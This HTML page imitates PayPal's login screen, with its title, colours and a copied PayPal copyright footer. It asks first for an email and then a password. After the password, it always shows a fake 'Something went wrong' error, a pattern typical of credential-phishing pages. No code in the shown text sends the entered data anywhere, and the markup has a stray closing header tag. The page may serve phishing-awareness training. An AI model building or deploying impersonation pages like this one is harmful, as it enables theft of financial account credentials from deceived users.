<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Log in to PayPal</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: "Helvetica Neue", Arial, sans-serif;
      background-color: #f5f7fa;
      min-height: 100vh;
    }

    header {
      background-color: #003087;
      padding: 0 24px;
      height: 64px;
      display: flex;
      align-items: center;
    }

    main {
      display: flex;
      justify-content: center;
      align-items: flex-start;
      padding: 40px 16px;
      min-height: calc(100vh - 64px);
    }

    .card-wrapper {
      width: 100%;
      max-width: 400px;
    }

    .card {
      background: #fff;
      border-radius: 6px;
      box-shadow: 0 0 6px rgba(0,0,0,.12);
      padding: 40px 32px 32px;
    }

    h1 {
      font-size: 24px;
      font-weight: 700;
      color: #2c2e2f;
      margin-bottom: 24px;
      text-align: center;
    }

    .input-wrap {
      margin-bottom: 16px;
    }

    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 14px 12px;
      font-size: 15px;
      border: 1.5px solid #9da3a6;
      border-radius: 4px;
      outline: none;
      color: #2c2e2f;
      font-family: inherit;
    }

    input.error-border {
      border-color: #d20000;
    }

    .error-msg {
      color: #d20000;
      font-size: 13px;
      margin-top: 6px;
      display: none;
    }

    .error-msg.visible {
      display: block;
    }

    .btn-primary {
      width: 100%;
      padding: 14px;
      background-color: #0070ba;
      color: #fff;
      font-size: 16px;
      font-weight: 700;
      border: none;
      border-radius: 25px;
      cursor: pointer;
      margin-bottom: 16px;
      font-family: inherit;
      transition: background-color 0.2s;
    }

    .btn-primary:disabled {
      background-color: #b0d0ee;
      cursor: not-allowed;
    }

    .btn-secondary {
      width: 100%;
      padding: 14px;
      background-color: #fff;
      color: #009cde;
      font-size: 16px;
      font-weight: 700;
      border: 1.5px solid #009cde;
      border-radius: 25px;
      cursor: pointer;
      font-family: inherit;
    }

    .link {
      color: #0070ba;
      text-decoration: none;
      font-size: 14px;
    }

    .link:hover { text-decoration: underline; }

    .text-center { text-align: center; }
    .mb-20 { margin-bottom: 20px; }

    hr {
      border: none;
      border-top: 1px solid #e0e0e0;
      margin: 20px 0;
    }

    .back-btn {
      background: none;
      border: none;
      cursor: pointer;
      color: #0070ba;
      font-size: 14px;
      padding: 0 0 16px;
      display: flex;
      align-items: center;
      gap: 4px;
      font-family: inherit;
    }

    .forgot-wrap {
      text-align: right;
      margin-bottom: 16px;
    }

    footer {
      text-align: center;
      margin-top: 24px;
      font-size: 12px;
      color: #6c7378;
    }

    footer a {
      color: #6c7378;
      text-decoration: none;
      margin-right: 12px;
    }

    footer p:last-child {
      color: #9da3a6;
      margin-top: 6px;
    }

    /* Step visibility */
    #step-email { display: block; }
    #step-password { display: none; }
  </style>
</head>
<body>

</header>

<main>
  <div class="card-wrapper">
    <div class="card">

      <!-- Step 1: Email -->
      <div id="step-email">
        <h1>Log in to PayPal</h1>
        <form id="form-email" onsubmit="handleEmailNext(event)">
          <div class="input-wrap">
            <input type="email" id="email-input" placeholder="Email or mobile number" autocomplete="email" />
            <p class="error-msg" id="email-error">Please enter your email or mobile number.</p>
          </div>
          <button type="submit" class="btn-primary">Next</button>
        </form>
        <div class="text-center mb-20">
          <a href="#" class="link">Having trouble logging in?</a>
        </div>
        <hr />
        <button class="btn-secondary">Sign Up</button>
      </div>

      <!-- Step 2: Password -->
      <div id="step-password">
        <button class="back-btn" onclick="goBack()">
          ← <span id="email-display"></span>
        </button>
        <h1>Enter your password</h1>
        <form id="form-password" onsubmit="handleLogin(event)">
          <div class="input-wrap">
            <input type="password" id="password-input" placeholder="Password" autocomplete="current-password" />
            <p class="error-msg" id="password-error">Please enter your password.</p>
          </div>
          <div class="forgot-wrap">
            <a href="#" class="link">Forgot password?</a>
          </div>
          <button type="submit" class="btn-primary" id="login-btn">Log In</button>
        </form>
      </div>

    </div>

    <!-- Footer -->
    <footer>
      <p>
        <a href="#">Contact</a>
        <a href="#">Privacy</a>
        <a href="#">Legal</a>
        <a href="#">Policy Updates</a>
      </p>
      <p>© 1999–2025 PayPal, Inc. All rights reserved.</p>
    </footer>
  </div>
</main>

<script>
  function handleEmailNext(e) {
    e.preventDefault();
    var email = document.getElementById('email-input').value.trim();
    var emailInput = document.getElementById('email-input');
    var emailError = document.getElementById('email-error');

    if (!email) {
      emailInput.classList.add('error-border');
      emailError.classList.add('visible');
      return;
    }

    emailInput.classList.remove('error-border');
    emailError.classList.remove('visible');

    document.getElementById('email-display').textContent = email;
    document.getElementById('step-email').style.display = 'none';
    document.getElementById('step-password').style.display = 'block';
    setTimeout(function() {
      document.getElementById('password-input').focus();
    }, 50);
  }

  function goBack() {
    document.getElementById('step-password').style.display = 'none';
    document.getElementById('step-email').style.display = 'block';
    document.getElementById('password-input').value = '';
    document.getElementById('password-input').classList.remove('error-border');
    document.getElementById('password-error').classList.remove('visible');
  }

  function handleLogin(e) {
    e.preventDefault();
    var password = document.getElementById('password-input').value;
    var passwordInput = document.getElementById('password-input');
    var passwordError = document.getElementById('password-error');
    var loginBtn = document.getElementById('login-btn');

    if (!password) {
      passwordInput.classList.add('error-border');
      passwordError.textContent = 'Please enter your password.';
      passwordError.classList.add('visible');
      return;
    }

    passwordInput.classList.remove('error-border');
    passwordError.classList.remove('visible');

    loginBtn.disabled = true;
    loginBtn.textContent = 'Logging in...';

    setTimeout(function() {
      loginBtn.disabled = false;
      loginBtn.textContent = 'Log In';
      passwordInput.classList.add('error-border');
      passwordError.textContent = 'Something went wrong. Please try again.';
      passwordError.classList.add('visible');
    }, 1500);
  }
</script>

</body>
</html>
